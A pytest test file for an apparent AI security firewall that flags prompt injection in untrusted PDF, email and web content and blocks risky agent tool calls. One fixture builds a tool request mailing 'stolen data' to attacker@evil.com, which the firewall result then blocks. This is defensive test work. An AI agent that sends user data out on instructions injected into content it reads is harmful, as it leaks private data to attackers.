import pytest
from pydantic import ValidationError
from fastapi.testclient import TestClient

from module3_firewall.app.main import app
from module3_firewall.models.security import (
    SourceType,
    SecurityDecision,
    SecurityInput,
    SecurityFinding,
    TaintMetadata,
    ToolRequest,
    FirewallResult,
)

client = TestClient(app)


def test_health_endpoint():
    """Verify GET /health returns status ok, module name, and current phase."""
    response = client.get("/health")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "ok"
    assert data["module"] == "Unified AI Security Firewall"
    assert data["phase"] in [1, 2, 3, 4, 5, 6]


def test_security_input_valid():
    """Verify SecurityInput can be instantiated with valid source types."""
    for valid_source in ["pdf", "email", "web", "text"]:
        sec_input = SecurityInput(
            source_type=valid_source,
            content="Sample untrusted payload",
            metadata={"filename": "doc.pdf"},
        )
        assert sec_input.source_type == valid_source
        assert sec_input.content == "Sample untrusted payload"
        assert sec_input.metadata["filename"] == "doc.pdf"


def test_security_input_invalid_source_type():
    """Verify invalid source_type is rejected by Pydantic validation."""
    with pytest.raises(ValidationError):
        SecurityInput(
            source_type="malicious_source",  # type: ignore
            content="Some text",
        )


def test_security_decision_valid():
    """Verify SecurityDecision accepts only ALLOW, CONFIRM, BLOCK."""
    for decision in ["ALLOW", "CONFIRM", "BLOCK"]:
        d = SecurityDecision(decision)
        assert d == decision

    assert SecurityDecision.ALLOW == "ALLOW"
    assert SecurityDecision.CONFIRM == "CONFIRM"
    assert SecurityDecision.BLOCK == "BLOCK"


def test_security_decision_invalid():
    """Verify invalid security decision values are rejected."""
    with pytest.raises(ValueError):
        SecurityDecision("REJECT")

    with pytest.raises(ValueError):
        SecurityDecision("PASS")


def test_all_models_creation():
    """Verify instantiation of all Pydantic models required for Phase 1."""
    finding = SecurityFinding(
        category="prompt_injection",
        severity="HIGH",
        description="Hidden system prompt override instruction detected",
    )
    assert finding.category == "prompt_injection"
    assert finding.severity == "HIGH"

    taint = TaintMetadata(
        taint_id="taint_12345",
        source_type="email",
        source_reference="msg_99",
        reason="Contains external untrusted instruction",
    )
    assert taint.taint_id == "taint_12345"

    tool_req = ToolRequest(
        tool_name="email_sender",
        action="send_mail",
        parameters={"to": "attacker@evil.com", "body": "stolen data"},
        request_id="req_001",
    )
    assert tool_req.tool_name == "email_sender"
    assert tool_req.request_id == "req_001"

    result = FirewallResult(
        request_id="req_001",
        decision=SecurityDecision.BLOCK,
        findings=[finding],
        taint=taint,
        trace=["Analyzer scanned input", "Taint tag attached", "Policy blocked send_mail"],
    )
    assert result.decision == SecurityDecision.BLOCK
    assert len(result.findings) == 1
    assert result.taint is not None
    assert result.taint.taint_id == "taint_12345"
    assert len(result.trace) == 3
